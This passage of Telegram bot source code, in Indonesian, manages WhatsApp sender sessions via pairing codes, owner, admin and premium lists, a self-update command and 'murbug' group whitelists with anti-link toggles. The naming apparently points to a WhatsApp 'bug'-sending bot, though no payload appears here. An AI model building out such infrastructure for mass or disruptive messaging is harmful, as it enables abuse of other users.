                    }, 3000 * reconnectAttempt);

                } else {
                    await ctx.replyWithHTML(
                        `<b>❌ Gagal reconnect setelah ${maxReconnect}x percobaan!</b>\n\n` +
                        `⌘ Nomor  : <code>+${phoneNumber}</code>\n` +
                        `⌘ Status : 🔴 Offline\n\n` +
                        `Gunakan <code>/addsender ${phoneNumber}</code> untuk ulangi.`
                    ).catch(() => {});
                }
            }
        });

    } catch (e) {
        console.log("addsender error:", e?.message);
        if (loadingMsg) {
            await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id).catch(() => {});
        }
        return ctx.reply(
            `❌ Terjadi kesalahan: ${e?.message || "Unknown error"}`
        ).catch(() => {});
    }
});
// ==========================================
// [ PRIVATE ONLY: LISTSENDER ]
// Owner/Admin Only - Private Only
// ==========================================
bot.command("listsender", async (ctx) => {
    if (!isPrivate(ctx)) return;
    if (!isOwnerOrAdmin(ctx.from.id)) {
        return ctx.reply("❌ Akses ditolak! Khusus Owner/Admin.");
    }

    try {

        const sock = global.waSocket || global.conn;
        const sockStatus = sock?.ws?.readyState === 1 ? "🟢 Terhubung" : "🔴 Tidak Terhubung";

        let sessCount = 0;
        let sessList = [];
        if (fs.existsSync("./session")) {
            const entries = fs.readdirSync("./session", { withFileTypes: true });
            sessList = entries.filter(e => e.isDirectory()).map(e => e.name);
            sessCount = sessList.length;
        }

        const listText = sessCount > 0
            ? sessList.map((s, i) => `  ${i + 1}. <code>+${s}</code>`).join("\n")
            : "  <i>Belum ada sender</i>";

        await ctx.replyWithHTML(
            `<b>｢ ACTIVE SENDER ｣</b>\n\n` +
            `⌘ Sesi Aktif : <code>${sessCount} Nomor</code>\n` +
            `⌘ Status WA  : ${sockStatus}\n` +
            `⌘ Engine     : Baileys v6\n\n` +
            `<b>Daftar Nomor:</b>\n${listText}`
        );
    } catch (e) {
        console.log("listsender error:", e?.message);
        return ctx.reply("❌ Folder session tidak ditemukan.");
    }
});

// ==========================================
// [ PRIVATE ONLY: DELSENDER ]
// Owner Only - Private Only
// ==========================================
bot.command("delsender", async (ctx) => {
    if (!isPrivate(ctx)) return;
    if (!isOwner(ctx)) {
        return ctx.reply("❌ Akses ditolak! Khusus Owner.");
    }

    try {

        if (fs.existsSync("./session")) {
            fs.rmSync("./session", { recursive: true, force: true });
            fs.mkdirSync("./session");
        }

        await ctx.replyWithHTML(
            `<b>✔️ Session berhasil dibersihkan!</b>\n\n` +
            `⌘ Status: Cleared\n` +
            `⌘ Bot akan reconnect otomatis...`
        );

        setTimeout(() => {
            if (typeof WhatsAppConnect === "function") {
                WhatsAppConnect().catch(e => console.log("Reconnect error:", e?.message));
            }
        }, 3000);

    } catch (e) {
        console.log("delsender error:", e?.message);
        return ctx.reply("❌ Terjadi kesalahan saat menghapus session.");
    }
});

// ==========================================
// [ PRIVATE ONLY: CEKPREM ]
// Private Only - Semua User
// ==========================================
bot.command("cekprem", async (ctx) => {
    if (!isPrivate(ctx)) return;

    try {
        const userId = ctx.from.id.toString();
        premiumUsers = loadJSON(premiumFile);
        const status = getStatus(userId);

        return ctx.replyWithHTML(
            `<b>[ CEK STATUS ]</b>\n\n` +
            `⌘ User   : <code>${ctx.from.first_name}</code>\n` +
            `⌘ ID     : <code>${userId}</code>\n` +
            `⌘ Status : <b>${status}</b>`
        );
    } catch (e) {
        console.log("cekprem private error:", e?.message);
    }
});

// ==========================================
// [ HELPER: CEK OWNER ]
// ==========================================
const checkOwners = (ctx, next) => {
    const userId = ctx.from?.id?.toString();
    if (!loadJSON(ownerFile).includes(userId)) {
        return ctx.replyWithHTML(
            "<blockquote>Owner Access Only</blockquote>\n" +
            "<b>Please Contact @xnnxdxc</b>"
        );
    }
    return next();
};

// ==========================================
// [ HELPER: DELETE SESSION ]
// ==========================================
function deleteSession() {
    try {
        const sessionDir = "./session";
        if (!fs.existsSync(sessionDir)) return false;

        const files = fs.readdirSync(sessionDir);
        if (files.length === 0) return false;

        files.forEach(file => {
            fs.rmSync(path.join(sessionDir, file), { recursive: true, force: true });
        });

        return true;
    } catch (e) {
        console.log("deleteSession error:", e?.message);
        return false;
    }
}

// ==========================================
// [ SLEEP GLOBAL - ANTI DUPLIKAT ]
// ==========================================
if (typeof global.sleep === "undefined") {
    global.sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
}

// ==========================================
// [ COMMAND: ADDADMIN ]
// Owner Only - Grup Only
// ==========================================
bot.command("addadmin", checkOwners, async (ctx) => {
    if (!isGroup(ctx)) {
        return ctx.reply("⚠️ Command ini hanya dapat digunakan di grup!");
    }

    try {
        const args = ctx.message.text.split(" ");
        if (args.length < 2) {
            return ctx.replyWithHTML(
                "<b>❌ Format: /addadmin ID</b>\n" +
                "Contoh: <code>/addadmin 123456789</code>"
            );
        }

        const userId = args[1].replace(/[^0-9]/g, "");
        if (!userId) return ctx.reply("❌ ID tidak valid!");

        // Reload data terbaru
        adminUsers = loadJSON(adminFile);

        if (adminUsers.includes(userId)) {
            return ctx.replyWithHTML(
                `<b>⚠️ User sudah menjadi admin!</b>\n` +
                `ID: <code>${userId}</code>`
            );
        }

        adminUsers.push(userId);
        saveJSON(adminFile, adminUsers);

        return ctx.replyWithHTML(
            `<b>✔️ Berhasil menambahkan admin!</b>\n\n` +
            `⌘ ID: <code>${userId}</code>\n` +
            `⌘ Status: Admin 🛡️`
        );
    } catch (e) {
        console.log("addadmin error:", e?.message);
        return ctx.reply("❌ Terjadi kesalahan saat menambahkan admin.");
    }
});

// ==========================================
// [ COMMAND: DELADMIN ]
// Owner Only - Grup Only
// ==========================================
bot.command("deladmin", checkOwners, async (ctx) => {
    if (!isGroup(ctx)) {
        return ctx.reply("⚠️ Command ini hanya dapat digunakan di grup!");
    }

    try {
        const args = ctx.message.text.split(" ");
        if (args.length < 2) {
            return ctx.replyWithHTML(
                "<b>❌ Format: /deladmin ID</b>\n" +
                "Contoh: <code>/deladmin 123456789</code>"
            );
        }

        const userId = args[1].replace(/[^0-9]/g, "");
        if (!userId) return ctx.reply("❌ ID tidak valid!");

        adminUsers = loadJSON(adminFile);

        if (!adminUsers.includes(userId)) {
            return ctx.replyWithHTML(
                `<b>⚠️ User tidak ditemukan di daftar admin!</b>\n` +
                `ID: <code>${userId}</code>`
            );
        }

        adminUsers = adminUsers.filter(id => id !== userId);
        saveJSON(adminFile, adminUsers);

        return ctx.replyWithHTML(
            `<b>✔️ Berhasil menghapus admin!</b>\n\n` +
            `⌘ ID: <code>${userId}</code>\n` +
            `⌘ Status: Dihapus dari Admin`
        );
    } catch (e) {
        console.log("deladmin error:", e?.message);
        return ctx.reply("❌ Terjadi kesalahan saat menghapus admin.");
    }
});

// ==========================================
// [ COMMAND: ADDPREM ]
// Owner & Admin - Grup Only
// ==========================================
bot.command("addprem", checkOwnerOrAdmin, async (ctx) => {
    if (!isGroup(ctx)) {
        return ctx.reply("⚠️ Command ini hanya dapat digunakan di grup!");
    }

    try {
        const args = ctx.message.text.split(" ");
        if (args.length < 2) {
            return ctx.replyWithHTML(
                "<b>❌ Format: /addprem ID</b>\n" +
                "Contoh: <code>/addprem 123456789</code>"
            );
        }

        const userId = args[1].replace(/[^0-9]/g, "");
        if (!userId) return ctx.reply("❌ ID tidak valid!");

        premiumUsers = loadJSON(premiumFile);

        if (premiumUsers.includes(userId)) {
            return ctx.replyWithHTML(
                `<b>⚠️ User sudah menjadi premium!</b>\n` +
                `ID: <code>${userId}</code>`
            );
        }

        premiumUsers.push(userId);
        saveJSON(premiumFile, premiumUsers);

        return ctx.replyWithHTML(
            `<b>✔️ Berhasil menambahkan premium!</b>\n\n` +
            `⌘ ID: <code>${userId}</code>\n` +
            `⌘ Status: Premium ✨`
        );
    } catch (e) {
        console.log("addprem error:", e?.message);
        return ctx.reply("❌ Terjadi kesalahan saat menambahkan premium.");
    }
});

// ==========================================
// [ COMMAND: DELPREM ]
// Owner & Admin - Grup Only
// ==========================================
bot.command("delprem", checkOwnerOrAdmin, async (ctx) => {
    if (!isGroup(ctx)) {
        return ctx.reply("⚠️ Command ini hanya dapat digunakan di grup!");
    }

    try {
        const args = ctx.message.text.split(" ");
        if (args.length < 2) {
            return ctx.replyWithHTML(
                "<b>❌ Format: /delprem ID</b>\n" +
                "Contoh: <code>/delprem 123456789</code>"
            );
        }

        const userId = args[1].replace(/[^0-9]/g, "");
        if (!userId) return ctx.reply("❌ ID tidak valid!");

        premiumUsers = loadJSON(premiumFile);

        if (!premiumUsers.includes(userId)) {
            return ctx.replyWithHTML(
                `<b>⚠️ User tidak ditemukan di daftar premium!</b>\n` +
                `ID: <code>${userId}</code>`
            );
        }

        premiumUsers = premiumUsers.filter(id => id !== userId);
        saveJSON(premiumFile, premiumUsers);

        return ctx.replyWithHTML(
            `<b>✔️ Berhasil menghapus premium!</b>\n\n` +
            `⌘ ID: <code>${userId}</code>\n` +
            `⌘ Status: Dihapus dari Premium`
        );
    } catch (e) {
        console.log("delprem error:", e?.message);
        return ctx.reply("❌ Terjadi kesalahan saat menghapus premium.");
    }
});

// ==========================================
// [ COMMAND: CEKPREM ]
// Semua User - Grup Only
// ==========================================
bot.command("cekprem", async (ctx) => {
    if (!isGroup(ctx)) {
        return ctx.reply("⚠️ Command ini hanya dapat digunakan di grup!");
    }

    try {
        const userId = ctx.from.id.toString();
        premiumUsers = loadJSON(premiumFile);

        const status = getStatus(userId);

        return ctx.replyWithHTML(
            `<b>[ CEK STATUS ]</b>\n\n` +
            `⌘ User: <code>${ctx.from.first_name}</code>\n` +
            `⌘ ID: <code>${userId}</code>\n` +
            `⌘ Status: <b>${status}</b>`
        );
    } catch (e) {
        console.log("cekprem error:", e?.message);
    }
});

bot.command("connect", checkWhatsAppConnection, async (ctx) => {
    if (!isGroup(ctx)) {
        return ctx.reply("⚠️ Command ini hanya bisa digunakan di grup!").catch(() => {});
    }
    if (!isOwner(ctx)) {
        return ctx.reply("❌ Akses ditolak! Khusus Owner.").catch(() => {});
    }

    const args = ctx.message.text.split(" ");
    const phoneNumber = args[1]?.replace(/[^0-9]/g, "");

    if (!phoneNumber || phoneNumber.length < 10) {
        return ctx.replyWithHTML(
            `<b>❌ Format salah!</b>\n\n` +
            `Gunakan: <code>/connect 628xxxxxxxxxx</code>\n` +
            `Contoh : <code>/connect 6281234567890</code>`
        ).catch(() => {});
    }

    let loadingMsg = null;

    try {
        loadingMsg = await ctx.replyWithHTML(
            `<b>⏳ Memproses pairing code untuk:</b> <code>+${phoneNumber}</code>...`
        ).catch(() => null);

        const sessionPath = `./session/${phoneNumber}`;

        try {
            if (fs.existsSync(sessionPath)) {
                fs.rmSync(sessionPath, { recursive: true, force: true });
            }
            fs.mkdirSync(sessionPath, { recursive: true });
        } catch (fsErr) {
            console.log("Session error:", fsErr?.message);
        }

        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWASocket({
            version,
            auth: state,
            printQRInTerminal: false,
            browser: ["Ubuntu", "Chrome", "20.0.04"],
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 0,
            keepAliveIntervalMs: 5000,
            retryRequestDelayMs: 250,
            logger: pino({ level: "silent" }),
            markOnlineOnConnect: false,
            syncFullHistory: false,
            fireInitQueries: false
        });

        global.waSocket = sock;
        global.conn = sock;
        sock.ev.on("creds.update", saveCreds);

        await new Promise(resolve => setTimeout(resolve, 3000));

        let pairingCode;
        try {
            pairingCode = await sock.requestPairingCode(phoneNumber);
        } catch (e) {
            if (loadingMsg) {
                await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id).catch(() => {});
            }
            return ctx.replyWithHTML(
                `<b>❌ Gagal generate pairing code!</b>\n\n` +
                `<code>${e?.message || "Unknown error"}</code>\n\n` +
                `Coba ketik ulang:\n<code>/connect ${phoneNumber}</code>`
            ).catch(() => {});
        }

        const formattedCode = pairingCode?.match(/.{1,4}/g)?.join("-") || pairingCode;

        if (loadingMsg) {
            await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id).catch(() => {});
        }

        await ctx.replyWithHTML(
            `<blockquote><b>｢ PAIRING CODE READY ｣</b></blockquote>\n\n` +
            `⌘ Nomor  : <code>+${phoneNumber}</code>\n` +
            `⌘ Code   : <code>${formattedCode}</code>\n\n` +
            `<b>Cara pairing:</b>\n` +
            `1. Buka WhatsApp di HP\n` +
            `2. Ketuk ⋮ → <b>Perangkat Tertaut</b>\n` +
            `3. Ketuk <b>Tautkan Perangkat</b>\n` +
            `4. Pilih <b>Tautkan dengan nomor telepon</b>\n` +
            `5. Masukkan kode di atas\n\n` +
            `⚠️ Kode berlaku <b>60 detik</b>`
        ).catch(() => {});

        let isConnected = false;
        let reconnectAttempt = 0;
        const maxReconnect = 5;

        sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === "open") {
                isConnected = true;
                reconnectAttempt = 0;
                await ctx.replyWithHTML(
                    `<blockquote><b>✔️ WHATSAPP TERHUBUNG!</b></blockquote>\n\n` +
                    `⌘ Nomor  : <code>+${phoneNumber}</code>\n` +
                    `⌘ Status : 🟢 Online\n` +
                    `⌘ Engine : Baileys v6\n\n` +
                    `<i>Sender siap digunakan!</i>`
                ).catch(() => {});
            }

            if (connection === "close") {
                isConnected = false;
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                const isLoggedOut = statusCode === DisconnectReason.loggedOut;

                if (isLoggedOut) {
                    await ctx.replyWithHTML(
                        `<b>⚠️ Session Tidak Valid!</b>\n\n` +
                        `⌘ Nomor  : <code>+${phoneNumber}</code>\n` +
                        `⌘ Status : 🔴 Offline\n\n` +
                        `Gunakan <code>/connect ${phoneNumber}</code> untuk ulangi.`
                    ).catch(() => {});

                    try {
                        if (fs.existsSync(sessionPath)) {
                            fs.rmSync(sessionPath, { recursive: true, force: true });
                        }
                    } catch (e) {}

                } else if (reconnectAttempt < maxReconnect) {
                    reconnectAttempt++;
                    console.log(`[WA] Reconnect ${reconnectAttempt}/${maxReconnect} for ${phoneNumber}`);

                    setTimeout(async () => {
                        try {
                            const { state: newState, saveCreds: newSaveCreds } = await useMultiFileAuthState(sessionPath);
                            const { version: newVersion } = await fetchLatestBaileysVersion();

                            const newSock = makeWASocket({
                                version: newVersion,
                                auth: newState,
                                printQRInTerminal: false,
                                browser: ["Ubuntu", "Chrome", "20.0.04"],
                                connectTimeoutMs: 60000,
                                defaultQueryTimeoutMs: 0,
                                keepAliveIntervalMs: 5000,
                                retryRequestDelayMs: 250,
                                logger: pino({ level: "silent" }),
                                markOnlineOnConnect: false,
                                syncFullHistory: false,
                                fireInitQueries: false
                            });

                            global.waSocket = newSock;
                            global.conn = newSock;
                            newSock.ev.on("creds.update", newSaveCreds);

                            newSock.ev.on("connection.update", async (u) => {
                                if (u.connection === "open") {
                                    isConnected = true;
                                    reconnectAttempt = 0;
                                    await ctx.replyWithHTML(
                                        `<blockquote><b>✔️ WHATSAPP TERHUBUNG!</b></blockquote>\n\n` +
                                        `⌘ Nomor  : <code>+${phoneNumber}</code>\n` +
                                        `⌘ Status : 🟢 Online\n\n` +
                                        `<i>Sender siap digunakan!</i>`
                                    ).catch(() => {});
                                }
                            });

                            newSock.ev.on("creds.update", newSaveCreds);

                        } catch (e) {
                            console.log(`[WA] Reconnect error: ${e?.message}`);
                        }
                    }, 3000 * reconnectAttempt);

                } else {
                    await ctx.replyWithHTML(
                        `<b>❌ Gagal reconnect setelah ${maxReconnect}x percobaan!</b>\n\n` +
                        `⌘ Nomor  : <code>+${phoneNumber}</code>\n` +
                        `⌘ Status : 🔴 Offline\n\n` +
                        `Gunakan <code>/connect ${phoneNumber}</code> untuk ulangi.`
                    ).catch(() => {});
                }
            }
        });

    } catch (e) {
        console.log("connect error:", e?.message);
        if (loadingMsg) {
            await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id).catch(() => {});
        }
        return ctx.reply(
            `❌ Terjadi kesalahan: ${e?.message || "Unknown error"}`
        ).catch(() => {});
    }
});

// ==========================================
// [ GRUP ONLY: LISTSENDER ]
// Owner/Admin Only - Grup Only
// ==========================================
bot.command("listsender", async (ctx) => {
    if (!isGroup(ctx)) return;
    if (!isOwnerOrAdmin(ctx.from.id)) {
        return ctx.reply("❌ Akses ditolak! Khusus Owner/Admin.").catch(() => {});
    }

    try {

        const sock = global.waSocket || global.conn;
        const sockStatus = sock?.ws?.readyState === 1 ? "🟢 Terhubung" : "🔴 Tidak Terhubung";

        let sessCount = 0;
        let sessList = [];
        if (fs.existsSync("./session")) {
            const entries = fs.readdirSync("./session", { withFileTypes: true });
            sessList = entries.filter(e => e.isDirectory()).map(e => e.name);
            sessCount = sessList.length;
        }

        const listText = sessCount > 0
            ? sessList.map((s, i) => `  ${i + 1}. <code>+${s}</code>`).join("\n")
            : "  <i>Belum ada sender</i>";

        await ctx.replyWithHTML(
            `<b>｢ ACTIVE SENDER ｣</b>\n\n` +
            `⌘ Sesi Aktif : <code>${sessCount} Nomor</code>\n` +
            `⌘ Status WA  : ${sockStatus}\n` +
            `⌘ Engine     : Baileys v6\n\n` +
            `<b>Daftar Nomor:</b>\n${listText}`
        ).catch(() => {});
    } catch (e) {
        console.log("listsender error:", e?.message);
        return ctx.reply("❌ Folder session tidak ditemukan.").catch(() => {});
    }
});

// ==========================================
// [ CALLBACK: Close ] - Group Only
// ==========================================
bot.action("close", async (ctx) => {
    if (!isGroup(ctx)) {
        return ctx.answerCbQuery("⚠️ Hanya untuk grup!").catch(() => {});
    }
    await ctx.deleteMessage().catch(() => {});
});
// ==========================================
// [ COMMAND: DELSESSIONS ]
// Owner Only - Grup Only
// ==========================================
bot.command("delsessions", checkOwners, async (ctx) => {
    if (!isGroup(ctx)) {
        return ctx.reply("⚠️ Command ini hanya dapat digunakan di grup!");
    }

    try {
        const success = deleteSession();

        if (success) {
            await ctx.replyWithHTML(
                `<b>✔️ Session berhasil dihapus!</b>\n\n` +
                `⌘ Status: Cleared\n` +
                `⌘ Bot akan reconnect otomatis...`
            );

            // Reconnect WhatsApp setelah delete session
            setTimeout(() => {
                if (typeof WhatsAppConnect === "function") {
                    WhatsAppConnect().catch(e => {
                        console.log("Reconnect error:", e?.message);
                    });
                }
            }, 3000);

        } else {
            return ctx.reply("⚠️ Tidak ada session yang tersimpan saat ini.");
        }
    } catch (e) {
        console.log("delsessions error:", e?.message);
        return ctx.reply("❌ Terjadi kesalahan saat menghapus session.");
    }
});

// ==========================================
// [ COMMAND: RESTART ]
// Owner Only - Grup Only
// ==========================================
bot.command("restart", checkOwners, async (ctx) => {
    if (!isGroup(ctx)) {
        return ctx.reply("⚠️ Command ini hanya dapat digunakan di grup!");
    }

    try {
        await ctx.replyWithHTML(
            `<b>🔄 Restarting Engine...</b>\n\n` +
            `⌘ Status: Rebooting\n` +
            `⌘ Mohon tunggu beberapa detik...`
        );

        setTimeout(() => {
            process.exit(0);
        }, 2000);

    } catch (e) {
        console.log("restart error:", e?.message);
    }
});

// ==========================================
// [ COMMAND: CANCERUP — UPDATE MANUAL ]
// ==========================================
bot.command("cancerup", checkOwners, async (ctx) => {
    try {
        const bars = [
            "░░░░░░░░░░  0%",
            "██░░░░░░░░ 20%",
            "████░░░░░░ 40%",
            "██████░░░░ 60%",
            "████████░░ 80%",
            "██████████ 100%",
        ];

        const sent = await ctx.replyWithHTML(
            `<pre><code class="language-yaml">` +
            `╔══════ CANCER UPDATE ══════════╗\n\n` +
            `  Status  : 🔄 Memulai update...\n` +
            `  Progress: ${bars[0]}\n\n` +
            `╚═══════════════════════════════╝` +
            `</code></pre>`
        );

        // Animasi progress bar
        for (let i = 1; i < bars.length; i++) {
            await new Promise(r => setTimeout(r, 700));
            await ctx.telegram.editMessageText(
                ctx.chat.id, sent.message_id, null,
                `<pre><code class="language-yaml">` +
                `╔══════ CANCER UPDATE ══════════╗\n\n` +
                `  Status  : 🔄 Mengunduh update...\n` +
                `  Progress: ${bars[i]}\n\n` +
                `╚═══════════════════════════════╝` +
                `</code></pre>`,
                { parse_mode: "HTML" }
            ).catch(() => {});
        }

        // Kirim sinyal ke parent process (script user)
        if (process.send) {
            process.send('cancerup');
        }

        // Dengerin hasil dari parent
        const result = await new Promise((resolve) => {
            const timeout = setTimeout(() => resolve('timeout'), 30000);
            process.once('message', (msg) => {
                if (msg?.type === 'cancerup_result') {
                    clearTimeout(timeout);
                    resolve(msg.status);
                }
            });
        });

        const statusMsg = {
            'success':      '  Status  : ✅ Update berhasil!\n  Info    : Bot direstart...',
            'same':         '  Status  : ℹ️  Sudah versi terbaru\n  Info    : Tidak ada update',
            'failed':       '  Status  : ❌ Update gagal\n  Info    : Cek console panel',
            'token_invalid':'  Status  : ❌ Token tidak valid!\n  Info    : Hubungi owner',
            'timeout':      '  Status  : ⚠️ Timeout\n  Info    : Cek console panel',
        }[result] || '  Status  : ❓ Unknown';

        await ctx.telegram.editMessageText(
            ctx.chat.id, sent.message_id, null,
            `<pre><code class="language-yaml">` +
            `╔══════ CANCER UPDATE ══════════╗\n\n` +
            `${statusMsg}\n\n` +
            `╚═══════════════════════════════╝` +
            `</code></pre>`,
            { parse_mode: "HTML" }
        ).catch(() => {});

    } catch (e) {
        console.log("cancerup error:", e?.message);
    }
});

// ==========================================
// [ ACTION: CLOSE ]
// ==========================================
bot.action("close", async (ctx) => {
    try {
        await ctx.deleteMessage();
        await ctx.answerCbQuery().catch(() => {});
    } catch (e) {
        console.log("close error:", e?.message);
        await ctx.answerCbQuery().catch(() => {});
    }
});
// ==========================================
// [ HELPER: CEK MURBUG & VIP ]
// ==========================================
function isMurbugGroup(chatId) {
    try {
        const data = loadJSON(murbugFile);
        return data.includes(chatId.toString());
    } catch (e) {
        return false;
    }
}

// ─── Murbug Settings Helper ───
const loadMurbugSettings = () => {
    if (!fs.existsSync(murbugSettingsFile)) return {};
    try {
        const raw = JSON.parse(fs.readFileSync(murbugSettingsFile, "utf8"));
        return (raw && typeof raw === "object" && !Array.isArray(raw)) ? raw : {};
    } catch { return {}; }
};
const saveMurbugSettings = (data) => {
    fs.writeFileSync(murbugSettingsFile, JSON.stringify(data, null, 2));
};
function getMurbugSetting(chatId, key) {
    const settings = loadMurbugSettings();
    return settings[chatId.toString()]?.[key] === true;
}
function setMurbugSetting(chatId, key, value) {
    const settings = loadMurbugSettings();
    const id = chatId.toString();
    if (!settings[id]) settings[id] = {};
    settings[id][key] = value;
    saveMurbugSettings(settings);
}

// ─── Maintenance Helper ───
const loadMaintenance = () => {
    try {
        const raw = JSON.parse(fs.readFileSync(maintenanceFile, "utf8"));
        return raw?.active === true;
    } catch { return false; }
};
const saveMaintenance = (active) => {
    fs.writeFileSync(maintenanceFile, JSON.stringify({ active }, null, 2));
};

// ─── Check Follow Channel ───
async function isFollowingChannel(userId) {
    try {
        if (!CHANNEL_USERNAME) return true; // kalau tidak diset, skip cek
        const member = await bot.telegram.getChatMember(
            CHANNEL_USERNAME.startsWith("@") ? CHANNEL_USERNAME : "@" + CHANNEL_USERNAME,
            userId
        );
        return ["member", "administrator", "creator"].includes(member.status);
    } catch (e) {
        return true; // kalau error (misal channel private), anggap sudah follow
    }
}

function isVipUser(userId) {
    const id = userId.toString();
    return (
        loadJSON(ownerFile).includes(id) ||
        loadJSON(adminFile).includes(id) ||
        loadJSON(premiumFile).includes(id)
    );
}

function isOwnerOrAdmin(userId) {
    const id = userId.toString();
    return (
        loadJSON(ownerFile).includes(id) ||
        loadJSON(adminFile).includes(id)
    );
}

function getCurrentDate() {
    return moment().tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss");
}

// ==========================================
// [ MURBUG MANAGEMENT - OWNER & ADMIN ONLY ]
// ==========================================

// /addmurbug - tambah grup ke whitelist
bot.command("addmurbug", async (ctx) => {
    if (!isGroup(ctx)) return;
    if (!isOwnerOrAdmin(ctx.from.id)) {
        return ctx.replyWithHTML(
            "<blockquote>Owner & Admin Access Only</blockquote>\n" +
            "<b>Please Contact @xnnxdxc</b>"
        );
    }

    try {
        // Cek follow channel
        const isFollow = await isFollowingChannel(ctx.from.id);
        if (!isFollow) {
            const ch = CHANNEL_USERNAME?.startsWith("@") ? CHANNEL_USERNAME : "@" + (CHANNEL_USERNAME || "channel");
            return ctx.replyWithHTML(
                `<b>⚠️ WAJIB FOLLOW CHANNEL!</b>\n\n` +
                `Untuk menggunakan fitur murbug, kamu wajib follow channel kami terlebih dahulu.\n\n` +
                `📢 Channel: <b>${ch}</b>\n\n` +
                `Setelah follow, coba lagi!`
            );
        }

        const chatId = ctx.chat.id.toString();
        const data = loadJSON(murbugFile);

        if (data.includes(chatId)) {
            return ctx.replyWithHTML(
                `<b>⚠️ Grup ini sudah terdaftar di murbug!</b>\n` +
                `<code>${ctx.chat.title}</code>`
            );
        }

        data.push(chatId);
        saveJSON(murbugFile, data);
        murbugGroups = new Set(data);

        return ctx.replyWithHTML(
            `<b>✔️ Grup berhasil ditambahkan ke murbug!</b>\n\n` +
            `⌘ <b>Grup:</b> <code>${ctx.chat.title}</code>\n` +
            `⌘ <b>ID:</b> <code>${chatId}</code>`
        );
    } catch (e) {
        console.log("addmurbug error:", e?.message);
    }
});

// /delmurbug - hapus grup dari whitelist
bot.command("delmurbug", async (ctx) => {
    if (!isGroup(ctx)) return;
    if (!isOwnerOrAdmin(ctx.from.id)) {
        return ctx.replyWithHTML(
            "<blockquote>Owner & Admin Access Only</blockquote>\n" +
            "<b>Please Contact @xnnxdxc</b>"
        );
    }

    try {
        const chatId = ctx.chat.id.toString();
        let data = loadJSON(murbugFile);

        if (!data.includes(chatId)) {
            return ctx.replyWithHTML(
                `<b>⚠️ Grup ini tidak terdaftar di murbug!</b>\n` +
                `<code>${ctx.chat.title}</code>`
            );
        }

        data = data.filter(id => id !== chatId);
        saveJSON(murbugFile, data);
        murbugGroups = new Set(data);

        return ctx.replyWithHTML(
            `<b>✔️ Grup berhasil dihapus dari murbug!</b>\n\n` +
            `⌘ <b>Grup:</b> <code>${ctx.chat.title}</code>\n` +
            `⌘ <b>ID:</b> <code>${chatId}</code>`
        );
    } catch (e) {
        console.log("delmurbug error:", e?.message);
    }
});

// /listmurbug - lihat daftar grup whitelist
bot.command("listmurbug", async (ctx) => {
    if (!isOwnerOrAdmin(ctx.from.id)) {
        return ctx.replyWithHTML(
            "<blockquote>Owner & Admin Access Only</blockquote>\n" +
            "<b>Please Contact @xnnxdxc</b>"
        );
    }

    try {
        const data = loadJSON(murbugFile);
        const settings = loadMurbugSettings();

        if (data.length === 0) {
            return ctx.replyWithHTML(
                `<b>📋 LIST GRUP MURBUG</b>\n\n` +
                `<i>Belum ada grup yang terdaftar.</i>`
            );
        }

        let list =
            `<pre><code class="language-yaml">` +
            `╔══════ MURBUG LIST ══════╗\n\n` +
            `  Total Grup : ${data.length}\n\n`;

        data.forEach((id, i) => {
            const s = settings[id] || {};
            const on = "✔️"; const off = "❌";
            list +=
                `  ── Grup ${i + 1} ──\n` +
                `  ID          : ${id}\n` +
                `  AntiForward : ${s.antiforward ? on : off}\n` +
                `  AntiLink    : ${s.antilink ? on : off}\n` +
                `  AntiPromosi : ${s.antipromosi ? on : off}\n` +
                `  AntiFoto    : ${s.antifoto ? on : off}\n` +
                `  AntiVideo   : ${s.antivideo ? on : off}\n` +
                `  AntiStiker  : ${s.antistiker ? on : off}\n\n`;
        });

        list += `╚════════════════════════╝` + `</code></pre>`;

        return ctx.replyWithHTML(list);
    } catch (e) {
        console.log("listmurbug error:", e?.message);
    }
});

// ==========================================
// [ ANTI-FEATURES COMMANDS - GRUP ONLY ]
// ==========================================
// Toggle: /antiforward, /antilink, /antipromosi, /antifoto, /antivideo, /antistiker

const antiFeatures = [
    { cmd: "antiforward", label: "Anti Forward",  icon: "↩️" },
    { cmd: "antilink",    label: "Anti Link",     icon: "🔗" },
    { cmd: "antipromosi", label: "Anti Promosi",  icon: "📢" },
    { cmd: "antifoto",    label: "Anti Foto",     icon: "📷" },
    { cmd: "antivideo",   label: "Anti Video",    icon: "🎥" },
    { cmd: "antistiker",  label: "Anti Stiker",   icon: "🎭" },
];

antiFeatures.forEach(({ cmd, label, icon }) => {
    bot.command(cmd, async (ctx) => {
        if (!isGroup(ctx)) return ctx.replyWithHTML("<b>⚠️ Hanya untuk grup!</b>");
        if (!isOwnerOrAdmin(ctx.from.id)) return ctx.replyWithHTML(
            "<blockquote>Owner & Admin Access Only</blockquote>\n<b>Please Contact @xnnxdxc</b>"
        );
        if (!isMurbugGroup(ctx.chat.id)) return ctx.replyWithHTML(
            "<b>⚠️ Grup ini belum terdaftar murbug!</b>\n<i>Gunakan /addmurbug terlebih dahulu.</i>"
        );

        try {
            const chatId = ctx.chat.id.toString();
            const current = getMurbugSetting(chatId, cmd);
            const newVal = !current;
            setMurbugSetting(chatId, cmd, newVal);

            return ctx.replyWithHTML(
                `<b>${icon} ${label.toUpperCase()}</b>\n\n` +
                `<pre><code class="language-yaml">` +
                `  Grup   : ${ctx.chat.title}\n` +
                `  Status : ${newVal ? "✔️ AKTIF" : "❌ NONAKTIF"}\n` +
                `  By     : ${ctx.from.first_name}` +
                `</code></pre>`
            );
        } catch (e) { console.log(`${cmd} error:`, e?.message); }
    });
});

// /listanti - lihat status semua anti-features di grup ini
bot.command("listanti", async (ctx) => {
    if (!isGroup(ctx)) return ctx.replyWithHTML("<b>⚠️ Hanya untuk grup!</b>");
    if (!isOwnerOrAdmin(ctx.from.id)) return ctx.replyWithHTML(
        "<blockquote>Owner & Admin Access Only</blockquote>\n<b>Please Contact @xnnxdxc</b>"
    );

    try {
        const chatId = ctx.chat.id.toString();
        const on = "✔️ Aktif"; const off = "❌ Nonaktif";

        return ctx.replyWithHTML(
            `<b>🛡️ STATUS ANTI-FEATURES</b>\n` +
